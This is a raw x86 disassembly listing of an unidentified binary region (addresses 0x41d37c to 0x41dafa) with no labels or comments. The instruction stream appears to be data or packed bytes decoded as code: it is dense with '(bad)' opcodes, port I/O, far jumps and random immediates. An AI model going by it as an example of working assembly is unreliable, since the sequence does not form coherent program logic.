  41d37c:	mov    dh,0xdb
  41d37e:	add    al,0x27
  41d380:	dec    ebp
  41d381:	cwde   
  41d382:	stos   BYTE PTR es:[edi],al
  41d383:	cmp    DWORD PTR [ecx+eax*2+0x3494c335],0x3c
  41d38b:	fbstp  TBYTE PTR [esi+esi*2]
  41d38e:	sub    BYTE PTR [edx],0x65
  41d391:	mov    ds:0x6ec5390,eax
  41d396:	sub    edi,DWORD PTR ds:0x69fdd347
  41d39c:	adc    DWORD PTR [edi+eiz*4+0x6e],0x10bc932a
  41d3a4:	jbe    0x41d3a8
  41d3a6:	mov    WORD PTR [ebp-0x439d59dd],ds
  41d3ac:	and    bl,BYTE PTR [eax]
  41d3ae:	pop    ds
  41d3af:	pushf  
  41d3b0:	and    eax,0xa580d6f7
  41d3b5:	push   eax
  41d3b6:	xlat   BYTE PTR ds:[ebx]
  41d3b7:	in     al,0x9f
  41d3b9:	mov    eax,0xdb598f4f
  41d3be:	je     0x41d3ad
  41d3c0:	js     0x41d359
  41d3c2:	(bad)  
  41d3c4:	ins    DWORD PTR es:[edi],dx
  41d3c5:	imul   esp,DWORD PTR [ecx-0x51de23e7],0xa757bfe7
  41d3cf:	cdq    
  41d3d0:	push   edi
  41d3d1:	push   ds
  41d3d2:	push   cs
  41d3d3:	scas   al,BYTE PTR es:[edi]
  41d3d4:	or     dl,BYTE PTR ds:0xd5e3b273
  41d3da:	pop    ebp
  41d3db:	popa   
  41d3dc:	xchg   ebp,eax
  41d3dd:	push   esp
  41d3de:	les    edi,FWORD PTR [ecx+0x1]
  41d3e1:	lock jno 0x41d411
  41d3e4:	xor    BYTE PTR [esi],dl
  41d3e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3e7:	add    eax,DWORD PTR [eax]
  41d3e9:	inc    edi
  41d3ea:	push   eax
  41d3eb:	(bad)  
  41d3ec:	loop   0x41d44c
  41d3ee:	push   edx
  41d3ef:	je     0x41d373
  41d3f1:	ror    BYTE PTR [edi],0xfe
  41d3f4:	shr    BYTE PTR [ecx+0x6dc08ff6],0x71
  41d3fb:	into   
  41d3fc:	sub    edx,DWORD PTR [eax+0x4cf6a4e7]
  41d402:	inc    ecx
  41d403:	scas   al,BYTE PTR es:[edi]
  41d404:	test   BYTE PTR [esi+0x8],0x8e
  41d408:	sub    DWORD PTR ds:0x78552b94,edx
  41d40e:	imul   ebp,DWORD PTR [ecx],0xb045ecf7
  41d414:	jmp    0x969d1c68
  41d419:	push   0x93605e34
  41d41e:	mov    ebx,0x1c68b6e9
  41d423:	push   cs
  41d424:	outs   dx,BYTE PTR ds:[esi]
  41d425:	out    0xea,al
  41d427:	xchg   esi,eax
  41d428:	aam    0xbd
  41d42a:	sbb    bl,BYTE PTR [edi+ebx*2]
  41d42d:	and    eax,0xbed0dd5c
  41d432:	and    al,0xa2
  41d434:	add    BYTE PTR [edi-0xf881036],al
  41d43a:	lds    ebx,FWORD PTR [ebp-0x31210f87]
  41d440:	sti    
  41d441:	xchg   edi,eax
  41d442:	lea    ebx,[eax+ecx*2-0x56]
  41d446:	jns    0x41d44a
  41d448:	pop    edx
  41d449:	enter  0x8f3b,0x9f
  41d44d:	and    ecx,ebx
  41d44f:	xchg   esi,eax
  41d450:	lea    eax,[edx]
  41d452:	fs sub esp,0x40
  41d456:	dec    edx
  41d457:	adc    DWORD PTR [ecx+ebp*4-0x64],eax
  41d45b:	add    bl,BYTE PTR ds:0xd6ef8958
  41d461:	out    dx,eax
  41d462:	mov    dh,0x5e
  41d464:	mov    gs,WORD PTR [esi-0x7a]
  41d467:	mov    ah,0xe4
  41d469:	fwait
  41d46a:	push   cs
  41d46b:	out    dx,eax
  41d46c:	rcl    DWORD PTR [eax+0x9],1
  41d46f:	sub    bl,BYTE PTR ds:0x4cc7c063
  41d475:	jg     0x41d488
  41d477:	addr16 popf 
  41d479:	imul   ebx,eax,0xf13b82f
  41d47f:	and    eax,0xb1897bc1
  41d484:	dec    esi
  41d485:	and    BYTE PTR [edi+edx*1],0x92
  41d489:	fwait
  41d48a:	loope  0x41d498
  41d48c:	add    ebp,edx
  41d48e:	and    bh,cl
  41d490:	jmp    0xe2cd:0xc8c4fd48
  41d497:	inc    esp
  41d498:	pushf  
  41d499:	cmp    DWORD PTR [esi+ebp*4-0x68a933d4],edi
  41d4a0:	fwait
  41d4a1:	retf   
  41d4a2:	or     BYTE PTR [edi+0x1],dl
  41d4a5:	loopne 0x41d500
  41d4a7:	mov    WORD PTR [ebx-0x73],gs
  41d4aa:	retf   0x703c
  41d4ad:	xchg   ecx,eax
  41d4ae:	xor    BYTE PTR [ecx],dl
  41d4b0:	inc    ebp
  41d4b1:	stc    
  41d4b2:	sbb    DWORD PTR [esi+0x7b],edi
  41d4b5:	ins    DWORD PTR es:[edi],dx
  41d4b6:	sbb    DWORD PTR [esi-0x33c5362f],esi
  41d4bc:	clc    
  41d4bd:	sub    eax,DWORD PTR cs:[esi]
  41d4c0:	rcr    DWORD PTR [ecx-0x53b9d2fe],1
  41d4c6:	and    esp,DWORD PTR [eax-0x15d030cb]
  41d4cc:	jne    0x41d451
  41d4ce:	out    dx,al
  41d4cf:	daa    
  41d4d0:	adc    esi,DWORD PTR [ecx+eiz*8+0x7c99a1c9]
  41d4d7:	mov    ch,0x60
  41d4d9:	jnp    0x41d52e
  41d4db:	cmp    DWORD PTR [esi+0x1b2453d0],0xffffffda
  41d4e2:	jbe    0x41d562
  41d4e4:	mov    bh,0x95
  41d4e6:	cli    
  41d4e7:	push   cs
  41d4e8:	and    BYTE PTR [edi+0x1c1171b4],bl
  41d4ee:	add    al,0xf6
  41d4f0:	adc    eax,0xd407db21
  41d4f5:	outs   dx,BYTE PTR ds:[esi]
  41d4f6:	xchg   esp,eax
  41d4f7:	fnstenv ds:0x991eb6ac
  41d4fd:	xchg   ebp,eax
  41d4fe:	pushf  
  41d4ff:	int    0x8d
  41d501:	in     al,dx
  41d502:	call   0x1d8f:0x2254e6d0
  41d509:	jnp    0x41d57c
  41d50b:	push   ebp
  41d50c:	sar    ebp,0x7d
  41d50f:	sub    dh,BYTE PTR [edi-0x31468058]
  41d515:	fabs   
  41d517:	jae    0x41d4f9
  41d519:	add    DWORD PTR [edi+ebx*1+0x15d9a2b2],esi
  41d520:	pop    esi
  41d521:	in     eax,0xa6
  41d523:	push   0xffffffd4
  41d525:	mov    BYTE PTR [esi+ecx*8],dl
  41d528:	sbb    BYTE PTR [ebx],ah
  41d52a:	in     al,0x28
  41d52c:	pop    edx
  41d52d:	popf   
  41d52e:	inc    edx
  41d52f:	adc    DWORD PTR cs:[esi+0x3ddb60bb],edx
  41d536:	or     edi,DWORD PTR ds:0x6c6d1196
  41d53c:	dec    esi
  41d53d:	dec    esi
  41d53e:	sbb    DWORD PTR [ebp-0x5c5f6047],esp
  41d544:	inc    ebp
  41d545:	jmp    0x42342222
  41d54a:	loope  0x41d4fc
  41d54c:	mov    edi,0xd3f6c47f
  41d551:	mov    al,ds:0xf8eec387
  41d556:	mov    ecx,0x99e8f5ca
  41d55b:	jp     0x41d55d
  41d55d:	or     al,0x23
  41d55f:	addr16 mov ds:0xce4e,al
  41d563:	cmp    BYTE PTR [edi],0x5b
  41d566:	inc    edi
  41d567:	push   ebp
  41d568:	lock cmp al,0xab
  41d56b:	fwait
  41d56c:	push   edx
  41d56e:	ss push ds
  41d570:	or     edi,ecx
  41d572:	adc    al,0x30
  41d574:	sbb    eax,0xdf955589
  41d579:	enter  0x1a9a,0x7c
  41d57d:	pop    ss
  41d57e:	sar    DWORD PTR [ecx+edi*2],cl
  41d581:	shl    ch,0xd3
  41d584:	adc    al,0x2a
  41d586:	mov    ch,BYTE PTR [ebx-0x6f]
  41d589:	and    BYTE PTR [ebp-0x35],ah
  41d58c:	out    dx,al
  41d58d:	cmp    DWORD PTR ds:0xb7878238,ebx
  41d593:	fdivr  QWORD PTR [ecx+0x78499788]
  41d599:	cmc    
  41d59a:	(bad)  
  41d59b:	jmp    0x41d54d
  41d59d:	and    BYTE PTR [edi],ch
  41d59f:	fdiv   DWORD PTR [edi]
  41d5a1:	call   0x4a73956a
  41d5a6:	jecxz  0x41d52e
  41d5a8:	xchg   edx,eax
  41d5a9:	into   
  41d5aa:	popf   
  41d5ab:	mov    ch,bl
  41d5ad:	mov    dl,0xa3
  41d5af:	pop    edx
  41d5b0:	mov    eax,0x8c493159
  41d5b5:	outs   dx,BYTE PTR ds:[esi]
  41d5b6:	popa   
  41d5b7:	sbb    eax,0xb269e7a
  41d5bc:	pusha  
  41d5bd:	scas   eax,DWORD PTR es:[edi]
  41d5be:	push   esp
  41d5bf:	bound  eax,QWORD PTR [edx+ebp*8]
  41d5c2:	push   edx
  41d5c3:	mov    al,0x2
  41d5c5:	jl     0x41d58f
  41d5c7:	pop    ebx
  41d5c8:	add    esp,ebx
  41d5ca:	inc    ecx
  41d5cb:	mov    esi,0x124f3949
  41d5d0:	inc    ecx
  41d5d1:	sub    dl,BYTE PTR [ebx]
  41d5d3:	inc    edx
  41d5d4:	outs   dx,DWORD PTR ds:[esi]
  41d5d5:	cmp    al,0xa3
  41d5d7:	dec    edi
  41d5d8:	aam    0x76
  41d5da:	stc    
  41d5db:	xor    BYTE PTR [ebx+0x4cb54022],ah
  41d5e1:	out    0xa3,al
  41d5e3:	mov    ebp,0x48c4822e
  41d5e8:	mov    ebp,es
  41d5ea:	mov    edi,0xeabd2247
  41d5ef:	jl     0x41d5ef
  41d5f1:	pop    esi
  41d5f2:	push   ecx
  41d5f3:	lar    ecx,WORD PTR [edi]
  41d5f6:	adc    dh,BYTE PTR [esi]
  41d5f8:	daa    
  41d5f9:	imul   edi,DWORD PTR [edi+0x29ec4fac],0xfb442ac1
  41d603:	adc    DWORD PTR ds:0x46769b26,ecx
  41d609:	and    ch,BYTE PTR [edx-0x9ef4d9a]
  41d60f:	cmc    
  41d610:	test   al,0x63
  41d612:	fisubr DWORD PTR [edx+0x59]
  41d615:	inc    edi
  41d616:	int    0x33
  41d618:	jmp    0x4ef37af7
  41d61d:	mov    DWORD PTR [ecx+0x98b5a5a],eax
  41d623:	jnp    0x41d643
  41d625:	pop    ecx
  41d626:	or     BYTE PTR [edi],dl
  41d628:	mov    ebp,0xaefc3dfc
  41d62d:	inc    ebp
  41d62e:	loope  0x41d68a
  41d630:	xlat   BYTE PTR ds:[ebx]
  41d631:	jmp    0x41d62b
  41d633:	push   0x60c798db
  41d638:	fcomp  DWORD PTR [ecx+edi*1+0x7e]
  41d63c:	push   ebp
  41d63d:	mov    ebp,0xbe02f85f
  41d642:	repz fiadd DWORD PTR [ebx-0x4d3ed9a5]
  41d649:	pop    ebp
  41d64a:	sbb    ax,0x7df1
  41d64e:	xor    eax,esi
  41d650:	mov    DWORD PTR [edx-0x40c0f982],ebp
  41d656:	xchg   esi,eax
  41d657:	fadd   QWORD PTR [edx]
  41d659:	loope  0x41d630
  41d65b:	jne    0x41d681
  41d65d:	sub    eax,0x5a6aff91
  41d662:	or     eax,0x63c3d1c6
  41d667:	sub    BYTE PTR [ecx],bl
  41d669:	sbb    esp,ebx
  41d66b:	popa   
  41d66c:	or     cl,dl
  41d66e:	jl     0x41d6d3
  41d670:	inc    ebp
  41d671:	adc    al,0x89
  41d673:	mov    BYTE PTR [edi+0x57],dh
  41d676:	out    dx,eax
  41d677:	dec    esi
  41d678:	dec    ebp
  41d679:	data16 add al,0x6f
  41d67c:	ins    BYTE PTR es:[edi],dx
  41d67d:	add    esi,DWORD PTR [ebx+0x2304dc68]
  41d683:	mov    edx,0xa1bc2394
  41d688:	lahf   
  41d689:	sbb    esp,ebp
  41d68b:	(bad)  
  41d68c:	hlt    
  41d68d:	xchg   ecx,eax
  41d68e:	xchg   ecx,eax
  41d68f:	out    dx,eax
  41d690:	test   eax,0x3cea8f0c
  41d695:	inc    ebx
  41d696:	ret    0x6f3c
  41d699:	pushf  
  41d69a:	jnp    0x41d70c
  41d69c:	sbb    DWORD PTR [ecx-0x38],ebp
  41d69f:	inc    ebp
  41d6a0:	or     DWORD PTR [ebx+0x54],esp
  41d6a3:	fstp   TBYTE PTR [eax-0x7b]
  41d6a6:	jle    0x41d6e1
  41d6a8:	add    eax,0x5f6f0d84
  41d6ad:	cdq    
  41d6ae:	push   esp
  41d6af:	xor    edi,edx
  41d6b1:	stos   BYTE PTR es:[edi],al
  41d6b2:	adc    BYTE PTR [edi],0x92
  41d6b5:	jmp    0x41c6a772
  41d6ba:	(bad)  
  41d6bb:	jg     0x41d6fb
  41d6bd:	cmp    esi,DWORD PTR ds:0x40588a7f
  41d6c3:	mov    edx,0x1b4b2814
  41d6c8:	sbb    ecx,DWORD PTR [edi+0x37]
  41d6cb:	xor    BYTE PTR [ecx],al
  41d6cd:	loopne 0x41d709
  41d6cf:	jl     0x41d6cd
  41d6d1:	call   DWORD PTR [ebp+0x68689acc]
  41d6d7:	sahf   
  41d6d8:	jmp    0x7fa5:0x34fda0b3
  41d6df:	cmp    edi,edx
  41d6e1:	pop    edi
  41d6e2:	xor    BYTE PTR [eax-0x1d],bh
  41d6e5:	cmp    dl,al
  41d6e7:	cld    
  41d6e8:	xor    edi,ebx
  41d6ea:	test   bh,0x7a
  41d6ed:	pop    ds
  41d6ee:	inc    edi
  41d6ef:	add    BYTE PTR ss:[ecx+ecx*4-0x3c0af26b],0xfd
  41d6f8:	adc    ch,BYTE PTR [ecx]
  41d6fa:	sub    ah,BYTE PTR [edx]
  41d6fc:	daa    
  41d6fd:	fstp   DWORD PTR [ecx+0x12]
  41d700:	popf   
  41d701:	bound  ebp,QWORD PTR [eax-0x4acc729d]
  41d707:	mov    BYTE PTR [edx+0x2891190],al
  41d70d:	mov    al,0x79
  41d70f:	xchg   ebx,eax
  41d710:	cmp    cl,BYTE PTR [edx-0x51554e47]
  41d716:	push   esp
  41d717:	push   0xffffff93
  41d719:	push   0xffffffc5
  41d71b:	out    dx,eax
  41d71c:	test   DWORD PTR [edx-0x5e],0xe02e23f0
  41d723:	or     bl,0xfc
  41d726:	adc    edi,DWORD PTR [edi+0x1ab37c28]
  41d72c:	inc    ebp
  41d72d:	push   es
  41d72e:	mov    ah,0x86
  41d730:	push   esp
  41d731:	stc    
  41d732:	xchg   esp,eax
  41d733:	mov    ds:0xad01ad3,al
  41d738:	daa    
  41d739:	loopne 0x41d7b3
  41d73b:	lods   eax,DWORD PTR ds:[esi]
  41d73c:	mov    ch,0x27
  41d73e:	(bad)  
  41d73f:	les    esi,FWORD PTR [ebx+0x75]
  41d742:	gs sahf 
  41d744:	sbb    BYTE PTR [edx],0x21
  41d747:	or     BYTE PTR [edi],cl
  41d749:	out    dx,eax
  41d74a:	xor    al,0x7e
  41d74c:	push   cs
  41d74d:	pop    ds
  41d74e:	(bad)  
  41d750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d751:	xchg   ebx,eax
  41d752:	stc    
  41d753:	and    al,BYTE PTR [esi+esi*1+0x1a]
  41d757:	shl    dh,cl
  41d759:	inc    ebp
  41d75a:	mov    dh,0x88
  41d75c:	mov    cl,0x5d
  41d75e:	je     0x41d720
  41d760:	pop    ss
  41d761:	ret    0xcb19
  41d764:	mov    dl,0xd0
  41d766:	lahf   
  41d767:	or     esp,ebx
  41d769:	pop    eax
  41d76a:	es jb  0x41d7a7
  41d76d:	adc    bh,BYTE PTR [esi+0x51]
  41d770:	loope  0x41d785
  41d772:	rcr    ch,0x5d
  41d775:	mov    edx,0x835787ca
  41d77a:	rcl    DWORD PTR [ecx-0x64d514e4],cl
  41d780:	into   
  41d781:	or     DWORD PTR [esp+edx*2+0x2],eax
  41d785:	in     al,dx
  41d786:	mov    BYTE PTR [eax],dh
  41d788:	sub    BYTE PTR [ebp+0x557c0947],0xb4
  41d78f:	repnz xchg ebp,eax
  41d791:	sbb    al,0x59
  41d793:	mov    ecx,0x73e8ea22
  41d798:	pop    ds
  41d799:	adc    eax,DWORD PTR [esi-0x8]
  41d79c:	out    dx,eax
  41d79d:	and    ah,BYTE PTR [eax]
  41d79f:	rol    edi,0xc5
  41d7a2:	xor    eax,0xfa8c7a00
  41d7a7:	fsubr  QWORD PTR [esi+esi*2+0x13]
  41d7ab:	(bad)  
  41d7ac:	dec    esi
  41d7ad:	or     ch,BYTE PTR [ebp-0x2b]
  41d7b0:	bound  esp,QWORD PTR [edx+0x4f2098b4]
  41d7b6:	std    
  41d7b7:	ror    BYTE PTR [edi+0x3647faae],0x79
  41d7be:	shr    ecx,0x6c
  41d7c1:	repz or edx,DWORD PTR [ebx]
  41d7c4:	shl    DWORD PTR [eax+0x16d72662],1
  41d7ca:	xor    eax,0x906a02d0
  41d7cf:	addr16 out 0xe9,al
  41d7d2:	rol    eax,cl
  41d7d4:	dec    ebp
  41d7d5:	std    
  41d7d6:	xchg   DWORD PTR [edx+eiz*2-0x2dc4669],esp
  41d7dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7de:	lock mov al,0x15
  41d7e1:	inc    ebp
  41d7e2:	mov    esi,0x3f9fae71
  41d7e7:	jne    0x41d821
  41d7e9:	xor    DWORD PTR [edx],ecx
  41d7eb:	adc    eax,DWORD PTR [edx-0x1a]
  41d7ee:	mov    eax,DWORD PTR [ebx+0x3ffbd21]
  41d7f4:	dec    ebx
  41d7f5:	add    ebx,DWORD PTR [ecx+ecx*2+0x69]
  41d7f9:	icebp  
  41d7fa:	jno    0x41d7c9
  41d7fc:	stc    
  41d7fd:	in     eax,dx
  41d7fe:	push   0x27
  41d800:	ins    BYTE PTR es:[edi],dx
  41d801:	shl    BYTE PTR [eax-0x47],1
  41d804:	pop    edx
  41d805:	pop    edi
  41d806:	cmp    bl,BYTE PTR [ecx-0x10]
  41d809:	stc    
  41d80a:	imul   ebx,DWORD PTR [eax-0x78abf16],0xda6a20af
  41d814:	in     eax,dx
  41d815:	mov    bl,0x17
  41d817:	push   edi
  41d818:	pop    edi
  41d819:	(bad)  
  41d81a:	pop    ds
  41d81b:	pop    edi
  41d81c:	mov    es,WORD PTR [edi-0x4a]
  41d81f:	cmp    BYTE PTR [ecx+0x52],0x51
  41d823:	pop    esi
  41d824:	leave  
  41d825:	fdiv   DWORD PTR [edx+0x2c]
  41d828:	jle    0x41d7b7
  41d82a:	inc    DWORD PTR [edi+eiz*1-0x386f7909]
  41d831:	dec    ebp
  41d832:	mov    ebp,0x4b66a81b
  41d837:	in     al,dx
  41d838:	sub    DWORD PTR [edi+0x2e],eax
  41d83b:	add    al,0x61
  41d83d:	jecxz  0x41d88d
  41d83f:	stos   DWORD PTR es:[edi],eax
  41d840:	inc    esi
  41d841:	dec    esp
  41d842:	xchg   esp,eax
  41d843:	mov    edi,0x63401f30
  41d848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d849:	pushf  
  41d84a:	pop    ss
  41d84b:	dec    edi
  41d84c:	dec    edx
  41d84d:	test   DWORD PTR [esi-0x12ba8673],ecx
  41d853:	jmp    0x6416b7f8
  41d858:	rcr    ebp,1
  41d85a:	add    al,0x84
  41d85c:	(bad)  
  41d85e:	clc    
  41d85f:	mov    ecx,0x7ef5ee32
  41d864:	adc    al,0xfe
  41d866:	test   BYTE PTR [ecx+eax*4-0x36d63d7b],bl
  41d86d:	or     al,0x1a
  41d86f:	adc    esi,eax
  41d871:	cmp    BYTE PTR [eax+0x6530b175],0x88
  41d878:	cwde   
  41d879:	in     eax,0x35
  41d87b:	out    dx,eax
  41d87c:	popa   
  41d87d:	fdiv   QWORD PTR [ebp+0x4c]
  41d880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d881:	pop    edi
  41d882:	out    0xb0,eax
  41d884:	fst    st(0)
  41d886:	icebp  
  41d887:	sub    edx,DWORD PTR [edi]
  41d889:	rcr    DWORD PTR [eax-0x3ac76d40],cl
  41d88f:	loopne 0x41d873
  41d891:	inc    edi
  41d892:	dec    ecx
  41d893:	mov    al,0xb8
  41d895:	mov    eax,ds:0xb230f2f0
  41d89a:	int3   
  41d89b:	pusha  
  41d89c:	ds push 0xe49d6cee
  41d8a2:	cmc    
  41d8a3:	jecxz  0x41d88e
  41d8a5:	sub    ebp,DWORD PTR [ebx]
  41d8a7:	jo     0x41d88e
  41d8a9:	xchg   ebp,eax
  41d8aa:	call   0xe210:0x77aae41f
  41d8b1:	cld    
  41d8b2:	lods   eax,DWORD PTR ds:[esi]
  41d8b3:	in     al,0x4f
  41d8b5:	fld    TBYTE PTR [ebp+0xe2d4e44]
  41d8bb:	sbb    cl,ch
  41d8bd:	shr    DWORD PTR [eax+0x2a],1
  41d8c0:	cmp    ecx,ebp
  41d8c2:	dec    ebp
  41d8c3:	in     al,dx
  41d8c4:	or     BYTE PTR [edx-0x12],ch
  41d8c7:	pop    ecx
  41d8c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8c9:	imul   edx,DWORD PTR [ebx],0x5f
  41d8cc:	jns    0x41d8fb
  41d8ce:	pop    esp
  41d8cf:	iret   
  41d8d0:	sub    edx,esp
  41d8d2:	scas   al,BYTE PTR es:[edi]
  41d8d3:	xor    BYTE PTR [ebx],bl
  41d8d5:	sub    ecx,DWORD PTR [ebp-0x116ba719]
  41d8db:	mov    cl,0x4f
  41d8dd:	jns    0x41d8d3
  41d8df:	adc    al,0x2a
  41d8e1:	mov    edx,0xec9ebca5
  41d8e6:	push   cs
  41d8e7:	mov    cl,0x62
  41d8e9:	(bad)  
  41d8ea:	bound  esi,QWORD PTR [ebx-0x311dda13]
  41d8f0:	stos   BYTE PTR es:[edi],al
  41d8f1:	das    
  41d8f2:	push   ecx
  41d8f3:	dec    esi
  41d8f4:	pop    es
  41d8f5:	cli    
  41d8f6:	and    BYTE PTR [edi+0x1bba1805],bh
  41d8fc:	data16 adc bl,BYTE PTR [edx-0x2370ea39]
  41d903:	inc    esi
  41d904:	call   0x3f7e3908
  41d909:	fwait
  41d90a:	out    dx,al
  41d90b:	jae    0x41d908
  41d90d:	xchg   ebx,eax
  41d90e:	push   esi
  41d90f:	dec    eax
  41d910:	fsubp  st(7),st
  41d912:	ds push edi
  41d914:	mov    ch,0x63
  41d916:	(bad)  
  41d918:	mov    ds:0x78f7a8e9,al
  41d91d:	div    DWORD PTR [esi+0xf]
  41d920:	push   eax
  41d921:	xchg   esp,eax
  41d922:	ds jecxz 0x41d924
  41d925:	repz and edx,DWORD PTR [ebx-0x44]
  41d929:	push   eax
  41d92a:	shl    DWORD PTR [esi+0x40],0xa9
  41d92e:	mov    eax,0x63bbaccd
  41d933:	aas    
  41d934:	imul   eax,esi,0xbee6fc98
  41d93a:	das    
  41d93b:	or     BYTE PTR [edx-0x5926bf5a],al
  41d941:	idiv   BYTE PTR [ebp+0x44]
  41d944:	call   DWORD PTR [ebx]
  41d946:	push   ecx
  41d947:	call   0x7114200f
  41d94c:	mov    DWORD PTR es:[edx+0x5b07994c],0xf7d99a05
  41d957:	mov    ebx,0xbee79a96
  41d95c:	ja     0x41d954
  41d95e:	add    al,0x26
  41d960:	mov    bl,ch
  41d962:	lods   eax,DWORD PTR ds:[esi]
  41d963:	jle    0x41d9b8
  41d965:	sub    bl,bh
  41d967:	jmp    0x42ec:0xcd5770e9
  41d96e:	push   es
  41d96f:	dec    eax
  41d970:	and    BYTE PTR [eax],cl
  41d972:	push   ebx
  41d973:	mov    esi,0xe2ec4c5e
  41d978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d979:	(bad)  
  41d97a:	out    0x66,al
  41d97c:	cmp    eax,0xceaa25b
  41d981:	cmp    bl,dh
  41d983:	jae    0x41d9f9
  41d985:	or     BYTE PTR [esi+0x49a92583],0x89
  41d98c:	xchg   esp,eax
  41d98d:	xchg   ebx,edx
  41d98f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d990:	neg    BYTE PTR [eax+0x16]
  41d993:	leave  
  41d994:	fcomp  QWORD PTR [ebx+0x14]
  41d997:	(bad)
  41d99b:	jge    0x41d940
  41d99d:	push   0xffffffdf
  41d99f:	cdq    
  41d9a0:	or     eax,0x4b3563c7
  41d9a5:	mov    DWORD PTR [edx],edx
  41d9a7:	js     0x41d9b8
  41d9a9:	es push ebp
  41d9ab:	sbb    DWORD PTR [ebx-0xa],0xfffffffd
  41d9af:	mov    esi,0xbc8609a5
  41d9b4:	sub    dh,BYTE PTR [ebp+0x2]
  41d9b7:	cmp    esp,edi
  41d9b9:	adc    eax,0x19d54611
  41d9be:	leave  
  41d9bf:	stos   DWORD PTR es:[edi],eax
  41d9c0:	dec    eax
  41d9c1:	jmp    0xb7944daf
  41d9c6:	cwde   
  41d9c7:	lods   eax,DWORD PTR ds:[esi]
  41d9c8:	pop    ss
  41d9c9:	jecxz  0x41d999
  41d9cb:	jne    0x41d976
  41d9cd:	scas   eax,DWORD PTR es:[edi]
  41d9ce:	ins    BYTE PTR es:[edi],dx
  41d9cf:	add    cl,dl
  41d9d1:	mov    bh,0xa7
  41d9d3:	xchg   esi,eax
  41d9d4:	in     al,dx
  41d9d5:	dec    esi
  41d9d6:	ret    0x6ee
  41d9d9:	cli    
  41d9da:	sahf   
  41d9db:	mov    WORD PTR [eax+0x40],fs
  41d9de:	mov    ah,0x26
  41d9e0:	mov    edi,0xe400b4c5
  41d9e5:	jns    0x41d9ac
  41d9e7:	std    
  41d9e8:	dec    edx
  41d9e9:	and    DWORD PTR [esi-0xf11e4ed],edx
  41d9ef:	lock scas al,BYTE PTR es:[edi]
  41d9f1:	cmc    
  41d9f2:	fld    st(4)
  41d9f4:	or     al,0xa4
  41d9f6:	loop   0x41da67
  41d9f8:	xor    al,BYTE PTR [edi+0x73550572]
  41d9fe:	in     al,dx
  41d9ff:	data16 cmc 
  41da01:	pusha  
  41da02:	push   eax
  41da03:	jmp    0x5fd3:0x58a37d99
  41da0a:	cli    
  41da0b:	pop    ss
  41da0c:	push   ecx
  41da0d:	je     0x41d9e6
  41da0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da10:	into   
  41da11:	push   ecx
  41da12:	adc    esp,ebx
  41da14:	xor    esp,DWORD PTR [edi+0x9]
  41da17:	pushf  
  41da18:	adc    bl,BYTE PTR [ebx]
  41da1a:	pop    esi
  41da1b:	rcl    bh,1
  41da1d:	dec    eax
  41da1e:	push   edx
  41da1f:	cmp    al,0xe
  41da21:	ficom  WORD PTR [ebx-0x345ac5d2]
  41da27:	dec    ebx
  41da28:	cmc    
  41da29:	pop    ds
  41da2a:	nop
  41da2b:	inc    ebp
  41da2c:	cld    
  41da2d:	dec    esp
  41da2e:	ins    BYTE PTR es:[edi],dx
  41da2f:	loope  0x41d9f4
  41da31:	inc    esp
  41da32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da33:	(bad)  
  41da35:	shr    bh,cl
  41da37:	xchg   edi,eax
  41da38:	int    0x7d
  41da3a:	sbb    eax,0x61775974
  41da3f:	cmp    esi,DWORD PTR [edx+0x3cd36c6a]
  41da45:	ret    
  41da46:	xchg   edi,ebx
  41da48:	sbb    ecx,esp
  41da4a:	push   ds
  41da4b:	inc    ebx
  41da4c:	xor    BYTE PTR [edx],al
  41da4e:	sub    BYTE PTR [edx],bh
  41da50:	js     0x41d9e4
  41da52:	xor    DWORD PTR [ebx],ebx
  41da54:	mov    bh,0x56
  41da56:	pop    ds
  41da57:	idiv   BYTE PTR [esp+ebp*2-0x75]
  41da5b:	jp     0x41d9f9
  41da5d:	dec    edx
  41da5e:	sbb    edx,esi
  41da60:	cs adc esi,ecx
  41da63:	fbld   TBYTE PTR [eax+eax*1]
  41da66:	fdivr  QWORD PTR [eax-0x2d]
  41da69:	mov    al,BYTE PTR [edx+0x39471773]
  41da6f:	leave  
  41da70:	xchg   edi,eax
  41da71:	bound  edx,QWORD PTR [ebp-0x190f8312]
  41da77:	cdq    
  41da78:	hlt    
  41da79:	jmp    0xe1c3:0xbd835341
  41da80:	push   esi
  41da81:	push   0xffffffb5
  41da83:	sahf   
  41da84:	mov    DWORD PTR [ebx+0x35],0xdf4efa42
  41da8b:	test   al,0x18
  41da8d:	stos   DWORD PTR es:[edi],eax
  41da8e:	pop    ebp
  41da8f:	pop    esi
  41da90:	pop    es
  41da91:	add    esp,DWORD PTR [eax-0x6d]
  41da94:	(bad)  
  41da95:	adc    al,0x4c
  41da97:	aas    
  41da98:	add    edx,DWORD PTR [edx+0x7d]
  41da9b:	test   eax,0x5583cc91
  41daa0:	dec    esi
  41daa1:	add    al,dl
  41daa3:	push   cs
  41daa4:	jbe    0x41da35
  41daa6:	cmp    DWORD PTR [edx],ecx
  41daa8:	call   0x7662:0x8edcbbdf
  41daaf:	(bad)  
  41dab0:	out    dx,eax
  41dab1:	adc    BYTE PTR [eax+eax*1],al
  41dab4:	mov    al,0x10
  41dab6:	and    DWORD PTR [ebx-0x30],0x79
  41daba:	(bad)  
  41dabb:	mov    esp,0xce8a9eff
  41dac0:	repz push edx
  41dac2:	jo     0x41daab
  41dac4:	and    bl,BYTE PTR ds:[edx+ebp*2+0x4ac7cd9]
  41dacc:	xchg   edi,eax
  41dacd:	pop    esi
  41dace:	xchg   BYTE PTR [edi+eiz*8],dl
  41dad1:	pop    ebx
  41dad2:	cld    
  41dad3:	jo     0x41da55
  41dad5:	retf   0xb8bc
  41dad8:	rcr    cl,0xae
  41dadb:	mov    ss,WORD PTR [ebp+0x5d]
  41dade:	sub    bh,dh
  41dae0:	mov    ds:0xa060cab2,al
  41dae5:	cmp    eax,DWORD PTR [eax+0x440503e8]
  41daeb:	pop    edi
  41daec:	out    0xf6,al
  41daee:	push   ss
  41daef:	add    BYTE PTR [edi-0x3e77a941],ch
  41daf5:	and    eax,0xd063040c
  41dafa:	inc    ebx
